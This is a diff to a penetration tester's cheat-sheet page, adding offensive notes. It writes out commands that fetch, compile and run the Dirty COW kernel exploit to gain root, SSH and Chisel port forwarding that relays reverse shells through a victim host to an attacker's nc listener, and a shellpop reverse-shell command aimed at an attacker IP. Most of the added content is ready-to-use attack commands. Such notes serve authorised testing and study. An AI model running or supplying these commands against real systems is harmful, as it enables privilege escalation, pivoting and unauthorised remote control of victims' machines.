@@ -1,6 +1,6 @@
 ﻿[![main-page](https://img.shields.io/badge/Back%20to%20the%20main%20page-snovvcrash.github.io-cc0000?style=for-the-badge&logo=jekyll&logoColor=cc0000)](https://snovvcrash.github.io/)
 
-Use your <kbd>Ctrl</kbd>-<kbd>F</kbd> to navigate around in this mess ☣️
+Use your <kbd>Ctrl</kbd>-<kbd>F</kbd> to navigate this mess ☣️
 
 [//]: # (# -- 5 spaces)
 [//]: # (## -- 4 spaces)
@@ -4093,16 +4093,20 @@ find / -type f -perm /6000 -ls 2>/dev/null
 
 ### Dirty COW
 
-* [https://dirtycow.ninja/](https://dirtycow.ninja/)
-* [https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
 * [https://github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
-* [https://github.com/exrienz/DirtyCow](https://github.com/exrienz/DirtyCow)
+
+```
+$ curl -L https://github.com/FireFart/dirtycow/raw/master/dirty.c > dirty.c
+$ gcc -pthread dirty.c -o dirty -lcrypt
+$ ./dirty Passw0rd
+$ su firefart
+```
 
 
 
 ### logrotate
 
-whotwagner/logrotten:
+* [https://github.com/whotwagner/logrotten/blob/master/logrotten.c](https://github.com/whotwagner/logrotten/blob/master/logrotten.c)
 
 ```
 $ curl https://github.com/whotwagner/logrotten/raw/master/logrotten.c > lr.c
@@ -4948,7 +4952,52 @@ Stager encryption is the same as for Ruler/Forms.
 
 * [PayloadsAllTheThings/Network Pivoting Techniques.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)
 * [https://www.programmersought.com/article/93593867459/](https://www.programmersought.com/article/93593867459/)
+
+
+
+
+## SSH
+
 * [https://habr.com/ru/post/331348/#t2](https://habr.com/ru/post/331348/#t2)
+
+* Attacker's IP: `10.10.13.37`
+* Victims's IP: `192.168.0.20`
+
+
+
+### Local vs Remote Port Forwarding Notes
+
+Listen port `443` on Victim and forward connections to port `1337` on Attacker. Here the Attacker (SSH client) connects to the Victim (SSH server), so the traffic is forwarded *from SSH server via SSH client* (i.e., **remote** port forwarding):
+
+```
+snovvcrash@attacker:~$ ssh -R 443:127.0.0.1:1337 root@192.168.0.20
+root@victim:~# netstat -tulpan | grep 443
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      19122/sshd: root@pt
+tcp6       0      0 :::443                  :::*                    LISTEN      19122/sshd: root@pt
+```
+
+Now I can listen port `1337` on Attacker, send a reverse-shell from a third-party host to Victim (`192.168.0.20:443`) and catch it on Attacker (`10.10.13.37:1337`):
+
+```
+snovvcrash@attacker:~$ rlwrap nc -lvnp 1337
+```
+
+For SSH server to listen at `0.0.0.0`, the `GatewayPorts yes` must be set in `sshd_config`:
+
+```
+$ sudo vi /etc/ssh/sshd_config
+$ sudo systemctl restart ssh
+```
+
+With Chisel server running on the Attacker the same can be achieved by doing **local** port forwarding, i.e. the traffic is forwarded *from Chisel (SSH) client via Chisel (SSH) server*:
+
+```
+snovvcrash@attacker:~$ ./chisel server -p 8000
+root@victim:~# nohup ./chisel client 10.10.13.37:8000 443:127.0.0.1:1337 &
+root@victim:~# netstat -tulpan | grep 443
+tcp6       0      0 :::443                 :::*                    LISTEN      18406/./chisel
+snovvcrash@attacker:~$ rlwrap nc -lvnp 1337
+```
 
 
 
@@ -5759,7 +5808,7 @@ PS > Start-Process -NoNewWindow .\xc.exe 10.10.13.38 443
 Bash reverse TCP:
 
 ```
-$ shellpop -H 192.168.119.124 -P 9001 --reverse --number 8 --base64
+$ shellpop -H 10.10.13.37 -P 9001 --reverse --number 8 --base64
 ```
 
 
